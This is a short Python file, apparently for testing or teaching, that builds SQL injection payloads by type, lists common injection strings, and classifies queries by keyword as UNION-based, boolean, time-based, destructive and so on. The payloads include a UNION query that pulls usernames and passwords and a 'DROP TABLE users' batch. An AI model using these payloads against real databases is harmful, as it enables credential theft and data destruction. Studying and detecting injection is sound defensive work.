def simulate_sql_injection(query, injection_type="union"):
    if injection_type == "union":
        return f"{query} UNION SELECT username, password FROM users"
    elif injection_type == "boolean":
        return f"{query} OR 1=1"
    elif injection_type == "time":
        return f"{query}; WAITFOR DELAY '0:0:5'"
    elif injection_type == "error":
        return f"{query}'"
    elif injection_type == "batch":
        return f"{query}; DROP TABLE users"
    else:
        return query

def get_common_injection_patterns():
    return [
        "' OR '1'='1", 
        "' OR 1=1--", 
        "'; DROP TABLE users--",
        "1 UNION SELECT username, password FROM users",
        "1; SELECT * FROM information_schema.tables",
        "' OR '1'='1' UNION SELECT 1,2,@@version--",
        "admin'--",
        "1' OR '1' = '1",
        "1' OR '1' = '1' --",
        "' OR '' = '",
        "1=1",
        "1' OR 1=1 LIMIT 1--",
        "' OR username LIKE '%admin%",
        "'; WAITFOR DELAY '0:0:5'--",
        "1'; SELECT pg_sleep(5)--"
    ]

def classify_injection_type(query):
    query = query.lower()
    
    if "union" in query and "select" in query:
        return "UNION-based"
    elif "or 1=1" in query or "or '1'='1" in query:
        return "Boolean-based"
    elif "waitfor" in query or "sleep" in query or "pg_sleep" in query or "benchmark" in query:
        return "Time-based"
    elif "drop" in query or "delete" in query or "truncate" in query:
        return "Destructive"
    elif "exec" in query or "execute" in query or "xp_" in query:
        return "Command Execution"
    elif "information_schema" in query or "sqlite_master" in query:
        return "Schema Discovery"
    elif "--" in query or "#" in query:
        return "Comment-based"
    elif "'" in query or '"' in query:
        return "Error-based"
    
    return "Unknown/Other"
